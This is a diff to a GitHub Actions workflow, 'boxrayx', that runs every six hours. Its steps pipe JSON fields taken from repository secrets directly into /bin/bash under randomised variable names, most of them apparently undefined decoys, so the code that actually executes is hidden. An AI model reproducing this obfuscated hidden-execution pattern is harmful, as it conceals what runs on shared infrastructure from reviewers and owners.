@@ -2,25 +2,33 @@ name: boxrayx
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 0/6 * * *'
-jobs:  # 29339
+    - cron: '54 4/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: boxrayx
         env:
-          vrjxt5754: ${{ secrets.vrjxt5754 }}
+          gsw5: ${{ secrets.gsw5 }}
         run: |
-          echo $vrjxt5754 | jq -r .e2 | /bin/bash
-          echo $oa0 | jq -r .zjv7280 | /bin/bash
-          echo $veh2 | jq -r .p52 | /bin/bash
-          echo $eawmk30541 | jq -r .gp11864 | /bin/bash
-          echo $dwtm058 | jq -r .sv869 | /bin/bash
-          echo $zt1349 | jq -r .eptn709 | /bin/bash
-          echo $iaz74011 | jq -r .y139 | /bin/bash
-          echo $umx48874 | jq -r .n95688 | /bin/bash
-          echo $sdl37668 | jq -r .zqaw34046 | /bin/bash
-          echo $lnwn967 | jq -r .j129 | /bin/bash
-          echo $wlf69 | jq -r .ocn91 | /bin/bash
+          echo $gsw5 | jq -r .f22 | /bin/bash
+          echo $bnxl0 | jq -r .majr4635 | /bin/bash
+          echo $gazuj61215 | jq -r .wxim548 | /bin/bash
+          echo $kep7541 | jq -r .jnha327 | /bin/bash
+          echo $acrtd03804 | jq -r .f6302 | /bin/bash
+          echo $ofmj3000 | jq -r .y6 | /bin/bash
+          echo $izg4 | jq -r .cdc84 | /bin/bash
+          echo $ue9 | jq -r .iw40 | /bin/bash
+          echo $eq6904 | jq -r .wn8297 | /bin/bash
+          echo $ulni487 | jq -r .tlj32837 | /bin/bash
+          echo $s74168 | jq -r .sw104 | /bin/bash
+          echo $vjvnz85842 | jq -r .j46732 | /bin/bash
+          echo $vypf41 | jq -r .dmvwd390 | /bin/bash
+          echo $ca73407 | jq -r .icph14 | /bin/bash
+          echo $qsep7420 | jq -r .amcyx254 | /bin/bash
+          echo $qai0160 | jq -r .lhxq17 | /bin/bash
+          echo $h78786 | jq -r .hasgm10117 | /bin/bash
+          echo $btrlc003 | jq -r .jizz79808 | /bin/bash
 
